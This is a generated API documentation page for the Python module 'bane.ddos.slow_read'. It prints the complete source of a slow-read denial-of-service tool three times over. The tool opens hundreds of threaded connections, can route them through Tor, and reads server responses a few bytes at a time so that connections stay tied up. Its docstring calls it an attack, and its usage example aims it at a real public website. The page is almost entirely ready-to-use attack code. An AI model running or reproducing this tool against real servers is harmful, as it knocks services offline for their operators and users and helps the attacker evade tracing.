<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.slow_read</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *
&#34;&#34;&#34;
   this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 500) number of connections
   timeout: (set by default to: 5) connection timeout flag 

   example:

   &gt;&gt;&gt;import bane
   &gt;&gt;&gt;bane.slow_read_attack(&#39;www.google.com&#39;,p=443,threads=300,timeout=7)

&#34;&#34;&#34;


class slow_read(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        paths=[&#34;/&#34;],
        threads_daemon=True,
        threads=500,
        timeout=5,
        min_speed=3,
        max_speed=5,
        max_read=3,
        min_read=1,
        logs=False,
        tor=False,
        duration=60,
    ):
        self.counter = 0
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.stop = False
        self.target = u
        self.port = p
        self.paths = paths
        self.timeout = timeout
        self.tor = tor
        self.read_max = max_read
        self.read_min = min_read
        self.min_speed = min_speed
        self.max_speed = max_speed
        self.logs = logs
        self.duration = duration
        self.start = time.time()
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout(self.timeout)
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                    s.connect((self.target, self.port))
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    while True:
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send(
                                setup_http_packet(
                                    self.target,
                                    3,
                                    self.paths,
                                    2,
                                    8,
                                    10,
                                    50,
                                    self.cookie,
                                    self.user_agents,
                                ).encode(&#34;utf-8&#34;)
                            )
                            self.counter += 1
                            while True:
                                d = s.recv(random.randint(self.read_min, self.read_max))
                                if self.logs == True:
                                    sys.stdout.write(
                                        &#34;\rReceived: {}   &#34;.format(
                                            str(d.decode(&#34;utf-8&#34;).strip())
                                        )
                                    )
                                    sys.stdout.flush()
                                    # print(&#34;Received: {}&#34;.format(str(d.decode(&#39;utf-8&#39;))))
                            time.sleep(random.randint(self.min_speed, self.max_speed))
                        except:
                            break
                    s.close()
                except:
                    pass
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.slow_read.slow_read"><code class="flex name class">
<span>class <span class="ident">slow_read</span></span>
<span>(</span><span>u, p=80, cookie=None, user_agents=None, paths=['/'], threads_daemon=True, threads=500, timeout=5, min_speed=3, max_speed=5, max_read=3, min_read=1, logs=False, tor=False, duration=60)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class slow_read(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        paths=[&#34;/&#34;],
        threads_daemon=True,
        threads=500,
        timeout=5,
        min_speed=3,
        max_speed=5,
        max_read=3,
        min_read=1,
        logs=False,
        tor=False,
        duration=60,
    ):
        self.counter = 0
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.stop = False
        self.target = u
        self.port = p
        self.paths = paths
        self.timeout = timeout
        self.tor = tor
        self.read_max = max_read
        self.read_min = min_read
        self.min_speed = min_speed
        self.max_speed = max_speed
        self.logs = logs
        self.duration = duration
        self.start = time.time()
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout(self.timeout)
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                    s.connect((self.target, self.port))
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    while True:
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send(
                                setup_http_packet(
                                    self.target,
                                    3,
                                    self.paths,
                                    2,
                                    8,
                                    10,
                                    50,
                                    self.cookie,
                                    self.user_agents,
                                ).encode(&#34;utf-8&#34;)
                            )
                            self.counter += 1
                            while True:
                                d = s.recv(random.randint(self.read_min, self.read_max))
                                if self.logs == True:
                                    sys.stdout.write(
                                        &#34;\rReceived: {}   &#34;.format(
                                            str(d.decode(&#34;utf-8&#34;).strip())
                                        )
                                    )
                                    sys.stdout.flush()
                                    # print(&#34;Received: {}&#34;.format(str(d.decode(&#39;utf-8&#39;))))
                            time.sleep(random.randint(self.min_speed, self.max_speed))
                        except:
                            break
                    s.close()
                except:
                    pass
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.slow_read.slow_read.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        time.sleep(1)
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                if self.tor == False:
                    s.settimeout(self.timeout)
                if self.tor == True:
                    s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                s.connect((self.target, self.port))
                if (self.port == 443) or (self.port == 8443):
                    s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                while True:
                    if (
                        int(time.time() - self.start) &gt;= self.duration
                    ):  # this is a safety mechanism so the attack won&#39;t run forever
                        break
                    if self.stop == True:
                        break
                    try:
                        s.send(
                            setup_http_packet(
                                self.target,
                                3,
                                self.paths,
                                2,
                                8,
                                10,
                                50,
                                self.cookie,
                                self.user_agents,
                            ).encode(&#34;utf-8&#34;)
                        )
                        self.counter += 1
                        while True:
                            d = s.recv(random.randint(self.read_min, self.read_max))
                            if self.logs == True:
                                sys.stdout.write(
                                    &#34;\rReceived: {}   &#34;.format(
                                        str(d.decode(&#34;utf-8&#34;).strip())
                                    )
                                )
                                sys.stdout.flush()
                                # print(&#34;Received: {}&#34;.format(str(d.decode(&#39;utf-8&#39;))))
                        time.sleep(random.randint(self.min_speed, self.max_speed))
                    except:
                        break
                s.close()
            except:
                pass
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.slow_read.slow_read" href="#bane.ddos.slow_read.slow_read">slow_read</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.slow_read.slow_read.attack" href="#bane.ddos.slow_read.slow_read.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>